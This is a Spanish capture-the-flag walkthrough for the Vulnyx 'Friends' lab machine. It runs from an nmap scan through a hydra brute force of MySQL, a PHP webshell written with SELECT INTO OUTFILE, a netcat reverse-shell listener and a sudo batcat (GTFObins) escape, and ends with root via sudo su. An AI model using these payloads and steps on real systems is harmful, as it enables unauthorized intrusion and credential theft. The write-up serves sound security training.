
# Vulnyx Friends

```bash
arp-scan -I eth0 --localnet
(IP-victima)
```

```bash
nmap -p 22,80,3306 -sS -sC -sV -n -Pn (IP-victima) -oN nmap
```
- 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
- 80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
- 3306/tcp open  mysql   MySQL 5.5.5-10.5.19-MariaDB-0+deb11u2

```bash
wfuzz
index.php
```

Luego de intentar por muchas vías, por lógica asumimos que tenemos dos posibles usuarios "beavis" y "butt-head" dado que al ingresar al puerto 80 tenemos una imagen de ellos dos y tenemos un puerto de MySQL al cual se le puede hacer fuerza bruta.

```bash
hydra -l beavis -P /usr/share/wordlists/rockyou.txt mysql://(IP-victima)
```
- [3306][mysql] host: (IP-victima)   login: beavis   password: r*******ll

Ahora a ingresar vía MySQL:
```bash
mysql -h (IP-victima) -u beavis -p
Enter password: r*********l
```
```sql
show databases;
use friends;
show tables;
select * from users;
```
- User: beavis   pass: b*******3
- User: butthead pass: B********!

Bien, luego de intentar ingresar sin éxito vía SSH ya que está bloqueado, damos con la información de que vía MySQL podemos leer archivos, así que apuntamos al archivo "index.php" con éxito.

**Dentro de MySQL:**
```sql
SELECT LOAD_FILE("/var/www/html/index.php");
/* print "For more Rock & Roll visit: /M3t4LL1c@ "; */
```
`/var/www/html` es una ruta por defecto de Apache.

Bien, hemos encontrado una nueva ruta que con wfuzz no dimos anteriormente.
Al ingresar vemos que es un gif sin mucho más.

Ahora, ya sabiendo que podemos leer archivos, intentaremos subir archivos vía MySQL.
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/M3t4LL1c@/webshell.php";
```
Ahora sí, podemos ejecutar comandos dentro de la nueva ruta.

```bash
http://(IP-victima)/M3t4LL1c@/webshell.php?cmd=whoami
www-data
```

Ahora toca meter una reverse shell urlencodeada. Yo ya la tengo, pero para conseguirla ingresar a [reverseshells.com](https://reverseshells.com) y urlencodearla con Burp Suite.

Nos ponemos en escucha con netcat:
```bash
nc -nlvp 443
```

Ejecutamos y ya estamos dentro como el usuario www-data. Ahora a hacer el tratamiento de la TTY para estar más cómodo.
```bash
script /dev/null -c bash
control+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Ya una vez dentro, encontramos los dos usuarios que ya conocíamos: Beavis y Butthead. Ahora toca escalar a esos usuarios para tener más privilegios.
```bash
sudo -l
(beavis) NOPASSWD: /usr/bin/batcat
```

Ok, según GTFObins podemos abrir una shell vía batcat: [GTFObins - batcat](https://gtfobins.github.io/gtfobins/batcat/)
```bash
sudo -u beavis /usr/bin/batcat --paging always /etc/profile
```
Se abre todo un menú con código y nos permite ejecutar un comando, ahí es donde pegamos el siguiente comando:
```bash
!/bin/sh
```
Y ya somos Beavis:
```bash
whoami
beavis
```

Luego de varios intentos, recordamos que tenemos la contraseña de Butthead, por lo tanto intentaremos por esa vía.
```bash
su butthead
pass: B******!
```
```bash
whoami
butthead
```

Al hacer `sudo -l` como Butthead, vemos que podemos ejecutar como root el binario "su":
```bash
sudo su
whoami
root
```
Ya somos root :D
